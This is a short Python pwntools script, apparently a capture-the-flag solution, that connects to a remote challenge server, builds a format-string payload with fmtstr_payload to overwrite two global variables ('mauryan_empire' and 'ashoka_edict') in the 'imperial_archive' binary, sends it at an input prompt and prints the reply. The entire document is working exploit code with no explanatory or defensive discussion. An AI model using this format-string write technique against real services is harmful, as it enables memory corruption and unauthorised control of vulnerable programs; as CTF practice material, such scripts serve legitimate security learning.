from pwn import *

context.binary = './imperial_archive'
context.log_level = 'info'

def exploit():
    p = remote('34.47.248.248', 35593)
    #p = process('./imperial_archive')
    elf = context.binary
    mauryan_empire_addr = elf.symbols['mauryan_empire']
    ashoka_edict_addr = elf.symbols['ashoka_edict']

    log.info(f"mauryan_empire address: 0x{mauryan_empire_addr:08x}")
    log.info(f"ashoka_edict address: 0x{ashoka_edict_addr:08x}")

    targets = {
        mauryan_empire_addr: 0x141,
        ashoka_edict_addr: 0x397B
    }

    payload = fmtstr_payload(4, targets, write_size='short')

    log.info(f"Payload length: {len(payload)} bytes")
    log.info("Sending royal inscription...")

    p.recvuntil(b"inscription: ")
    p.sendline(payload)

    output = p.recvall(timeout=10)

    try:
        print(output.decode('ascii', errors='ignore'))
    except:
        print("[*] Output contains non-ASCII characters, displaying raw bytes:")
        print(output)


if __name__ == "__main__":
    exploit()
